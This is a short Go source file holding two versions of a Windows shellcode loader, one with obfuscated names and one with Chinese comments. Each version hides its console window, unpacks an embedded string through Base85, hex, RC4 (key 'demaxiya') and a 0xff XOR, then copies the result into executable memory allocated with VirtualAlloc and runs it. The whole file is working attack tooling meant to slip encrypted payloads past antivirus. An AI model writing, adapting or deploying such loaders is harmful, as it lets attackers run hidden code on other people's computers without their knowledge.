package encode

import (
	"crypto/rc4"
	"encoding/hex"
	"syscall"
	"unsafe"

	"github.com/eknkc/basex"
	"github.com/lxn/win"
	"golang.org/x/sys/windows"
)
func a() {
	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
	b := []byte("demaxiya")
	c := "1m>R;_Qw{V84zc{WEXR4yS3kn5EqAKYynp}XQ}"

	base85, _ := basex.NewEncoding("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~")
	d, _ := base85.Decode(c)

	e := make([]byte, hex.DecodedLen(len(d)))
	f, _ := hex.Decode(e, d)
	e = e[:f]

	g, _ := rc4.NewCipher(b)
	h := make([]byte, len(e))
	g.XORKeyStream(h, e)

	i := make([]byte, len(h))
	for j := 0; j < len(h); j++ {
		i[j] = h[j] ^ 0xff
	}

	k, _ := syscall.LoadDLL("kernel32.dll")
	l, _ := k.FindProc("VirtualAlloc")

	m := uintptr(len(i))
	n, _, _ := l.Call(uintptr(0), m, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if n == 0 {
		panic("VirtualAlloc failed")
	}
	o := (*[0x1_000_000]byte)(unsafe.Pointer(n))[:m:m]
	copy(o, i)

	syscall.Syscall(n, 0, 0, 0, 0)
}
func decode() {


	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
	key := []byte("demaxiya")                                  // RC4 解密使用的密钥
	encodedMessage := "1m>R;_Qw{V84zc{WEXR4yS3kn5EqAKYynp}XQ}" // 编码后的片段

	// Base85 解码
	base85, _ := basex.NewEncoding("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~")
	hexCiphertext, _ := base85.Decode(encodedMessage)

	// 转为二进制
	rc4Message := make([]byte, hex.DecodedLen(len(hexCiphertext)))
	n, _ := hex.Decode(rc4Message, hexCiphertext)
	rc4Message = rc4Message[:n]

	// RC4 解密
	cipher, _ := rc4.NewCipher(key)
	xordMessage := make([]byte, len(rc4Message))
	cipher.XORKeyStream(xordMessage, rc4Message)

	// XOR 操作
	message := make([]byte, len(xordMessage))
	for i := 0; i < len(xordMessage); i++ {
		message[i] = xordMessage[i] ^ 0xff
	}

	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	VirtualAlloc, _ := kernel32.FindProc("VirtualAlloc")

	// 分配内存并写入 shellcode 内容
	allocSize := uintptr(len(message))
	mem, _, _ := VirtualAlloc.Call(uintptr(0), allocSize, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if mem == 0 {
		panic("VirtualAlloc failed")
	}
	buffer := (*[0x1_000_000]byte)(unsafe.Pointer(mem))[:allocSize:allocSize]
	copy(buffer, message)

	// 执行 shellcode
	syscall.Syscall(mem, 0, 0, 0, 0)
}
